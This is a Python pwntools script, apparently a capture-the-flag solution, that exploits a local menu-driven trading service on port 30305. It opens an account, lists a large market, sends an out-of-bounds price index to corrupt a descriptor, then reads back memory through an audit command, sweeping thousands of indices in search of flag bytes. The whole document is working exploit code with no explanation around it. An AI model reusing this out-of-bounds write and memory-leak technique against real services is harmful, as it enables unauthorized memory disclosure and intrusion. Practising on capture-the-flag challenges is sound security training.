from pwn import *

START_INDEX = 32768

def attempt_exploit(price_index):
    p = remote('localhost', 30305, level='error')

    def send_cmd(cmd):
        p.sendlineafter(b'> ', str(cmd).encode())

    try:
        # 1. Open account (Account 0)
        send_cmd(1)
        p.sendlineafter(b'bytes: ', b'4096')
        p.recvuntil(b'account: ')
        p.recvline()  # consume "0"

        # 2. List market to satisfy MIN_MARKET_OUTCOME_SLOTS
        send_cmd(4)
        p.sendlineafter(b'outcome_slots: ', b'32768')
        p.sendlineafter(b'memo_bytes: ', b'0')

        # 3. Open exchange
        send_cmd(5)
        p.recvuntil(b'exchange open\n')

        # 4. OOB descriptor write
        send_cmd(6)
        p.sendlineafter(b'price_index: ', str(price_index).encode())
        p.sendlineafter(b'account: ', b'0')
        p.sendlineafter(b'offset: ', b'0')
        p.sendlineafter(b'range: ', b'4096')
        p.recvuntil(b'quoted\n')

        # 5. Settle round 0
        send_cmd(7)
        p.sendlineafter(b'round: ', b'0')
        p.recvuntil(b'settled\n')

        # 6. Audit
        send_cmd(3)
        p.sendlineafter(b'account: ', b'0')
        p.sendlineafter(b'offset: ', b'0')
        p.sendlineafter(b'bytes: ', b'16')
        leak_hex = p.recvline().strip().decode()

        return leak_hex

    finally:
        p.close()

print("[*] Starting sweep locally first!")
for idx in range(START_INDEX, START_INDEX + 5000):
    try:
        leak = attempt_exploit(idx)
        leak_bytes = bytes.fromhex(leak)

        if leak_bytes != b'\x00' * 16:
            print(f"\n[+] Non-zero at index {idx}: {leak_bytes}")
            if b'UMD' in leak_bytes or b'flag' in leak_bytes:
                print(f"[+] FLAG HIT: {leak_bytes}")
                break
            # Could be a pointer/struct corruption rather than flag — keep going
        
        if idx % 50 == 0:
            print(f"[-] {idx}...", end='\r')

    except EOFError:
        print(f"[!] Server crashed at {idx}")
        continue
    except Exception as e:
        print(f"[!] Error at {idx}: {e}")
        continue
